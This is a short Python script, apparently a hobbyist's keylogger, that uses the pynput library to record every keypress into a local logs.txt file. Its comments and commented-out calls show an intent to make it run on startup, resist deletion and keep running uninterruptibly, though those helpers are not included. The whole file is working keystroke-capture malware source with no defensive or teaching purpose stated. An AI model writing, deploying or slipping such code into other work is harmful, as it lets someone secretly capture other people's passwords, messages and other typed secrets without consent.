# after this file being deleted automatically the code will still run forever 


from pynput.keyboard import Key, Listener
# from test import start_uninterruptible_task
# from test1 import make_file_undeletable
# import background_runner

def on_press(key):
    with open("logs.txt", "a") as file:
        file.write(f"{key}\n")
with Listener(on_press=on_press) as listener:
    listener.join()




# background_runner.run_on_startup(on_press())
# make_file_undeletable(on_press())
# start_uninterruptible_task(task_name="keylogger")

# for termination of the code we have to delete the terminal running the file